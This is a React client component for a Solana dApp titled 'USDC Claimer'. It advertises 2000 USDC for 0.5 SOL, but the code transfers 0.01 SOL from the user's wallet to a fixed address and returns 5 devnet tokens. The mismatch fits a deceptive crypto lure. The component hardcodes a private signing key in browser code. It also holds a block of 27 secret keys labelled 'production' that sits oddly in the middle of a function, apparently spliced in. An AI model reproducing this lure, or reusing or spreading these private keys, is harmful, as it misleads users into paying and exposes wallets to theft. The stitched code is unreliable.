/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2CxXfCSxpLvEEeoL7YjJXe3cdRSXucKaQBgpvAGtBTuTc7HX9o9voS6yfR8WQxh8YFmaratPdR7nKihNGp41sUwx"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2tJs6GbrvhSHUZEguqNofwfm6EgWsytVkqfQqs9JKyWc5iYCHKZfB1EUMZCh4YAyyfbSqab4pz4PbxR9EdukPn9d",
  "key1": "3cc8YeduTcL1SR4FCxiY33vw2utEW9LqS1YxYG6PA4zRKVGMonJKVYNDgfP5hFKZuS5ASrdCjReoLqUsJFAgENVq",
  "key2": "2D5WBQomEybqqfyxJx4eemBskAS9SEwyCtSrRRS6DXwahXEm51bwMUXX8b7Us7756JGEB18bZYnxdrgN2wFbzhWs",
  "key3": "38V4Kg9rwsy4t2eR3pALh6PUWHSWzLqbLRUAscvQLd5Zw7CdUxBaXrDNfbGxWRVc7MuYxaThr4Zxe2voGUMA6yr6",
  "key4": "2wR4xoDPGypxag8v8wqWohjHcCB9AWGESCeb58BGJzG4QDe5heNH9XEqgzCrwH3LKRFAk6sh1NgPfP6beiCqSgKT",
  "key5": "7W3z5s2i62SF3qo5A8xVZkSa1JaZZ47226i1H2zAHGqQvg5bbJ2X9JEG4WyYgYtWQ92XctFRXvCX2o6RayZVTp6",
  "key6": "5jSdaRMWWaVXRECGDmdWauBvxD9PH8KdG1ctMbhEvHoVBVNQQDyi88v7oyaUaJcKHx5xBVMTQVNZsVqxcsgtDxDv",
  "key7": "MR54qNg2bynZjLRdkdm4S3MWZfEHyE1SiXSFhAoFc9vpAeExtF2t5FsuHmBcPf2rZNg2NCN8jdrg5i33dHPuiXQ",
  "key8": "hRszwYkDg9KBgtUjSWhPXajG3qP1HmjLXiRUL92h6EY1F1NLLC9pauwP8ivNmC82n4eYBCqBoBMKXaUeCMYLvzk",
  "key9": "3MPMDmVX4oswfKbLybP7fTXCPhoMngNtrtzJzroHtNbLmKzH5SbMNTz87cvcWmPfxvip7g2y6mbSd1A1xkvGeBaA",
  "key10": "2sigCPDYUV4eKH8Vq7ZQTUk66ojoeBvqSZ3KCa5TLvpYULhHHQNJ8j5YMyb89YKWBbuBM6HeBiSXefSu9kx3R12i",
  "key11": "RsyuHTxboi26tHToGWuVCMZYiWBL1rYwHqewBs7ZDirvcrLneH3Bu2HctPcbmQPfhGaRKJy1KbRXYWX9ttpt8Qd",
  "key12": "3TLsKo9bfTsUNYmjrq9i6Crt9yT4Sc7eB6ThQdsFArGeK51gW6Gnif3jhX6a29vtAsokPPnqEFhaJ7ja9ii2PCCr",
  "key13": "4ZPousbFA2WNbQQ8WKVn8dH1vBcRcPf8wgEXX1Zz2mU7n14LnBB34Qgh1UBiinVidXQANNfayynMunPC1C6wPut3",
  "key14": "4WjywdPtHkxLp9mn4ZR4y8ceqQ7KY9z1GCrYyb7kjeGDwpBQ6mMvmLLiMK4cAemGcBzWfagibMWtrsKxiwkhdfXJ",
  "key15": "5FYwpYVzgq6kjh8JB8oinp7vUj53BiA65uExPAkQgphunCXGJcuKdYuk6bgKbR8vZAztBtjhDsmn7SABahaGGfW6",
  "key16": "55SU4ACG3z5Q6dR5XnVHSzjiESBNHMj83YPFvq7XYzvXuNRKMyCouK7KtHeTFDeuFAdp2B3XuEEu9muMd3rR16T8",
  "key17": "3JeuC6LLfBpMJKdHACFXPagqm5KBgL5SVrJgdFCwNAVm4PnzhwNhAdvLCZi9QoJfAPAJT92ak1jxihoNbGHehyuk",
  "key18": "4ZMLSn9KPY2PjRbqMci2Zcr4vyvs6wi44Rxp624XMo5Dx782UUcehaeBSX9pAKWMcWhTn4fpesFfAijqjyoBGHM4",
  "key19": "4btdz4LyKxSHZLDjbY5LWgJZo8fsX9EQ3eds8ePF7xmUjVJBCNjYimE9f5fBALSS6WVw7ah67iZkPv7f9YkTFp1c",
  "key20": "4vmJCdvtqMoHJipXi19gBwjgh31DeDyAzfQJJzvJMSmhRBjQx8CySQ68UTLtHKHdzQptd3mHwQ3Use6nYBZtxLvm",
  "key21": "qCSbV97QyCfHB1bHC9TFPapTrb8xVDqaX3bmp5hBXnQxRCcNMuF3g173UQJv9LhixbGiDgZeYrQXqNzoG5hC2os",
  "key22": "2QcYB3iVVBCkiJxZSfCzX11ZcnkaJT2E45246QUWpk7RCXRuja3gzSr7MbCeFZptrHgrbMbLRu7mc9ycbi7VBZDx",
  "key23": "2SvjJ1kgCFSAamYs4g1FQfqMLS59rP2EBmMureZKxcm6pZuTmYx23jJXr3yjt1bUJx5VCqcigVZ3KxRV54VcM8BG",
  "key24": "5bmHBWMyFA2D5KPQnvpKgj4egxoABwD5jDzgyddDae4Q5iZS5TNz6HJTkbMxa4DsYJiC5DVfsxKFmnhvvMY62ruj",
  "key25": "TQKrG9A7rn5JQtk9uom8Fbfbq1USi4r3kukW9NG8BYUERSAgtnjCwGJZGuGuMetMQVcTqMXg49a5wkcwxn7tWXX",
  "key26": "4hEit7qppPWGNZZU2sgnK26NQNfgMB27z5wCNgsmbaZ2zy4TZUutNBfVeLxaRQ3n1khEhNKsQFTPoRehF2ni6AKt"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
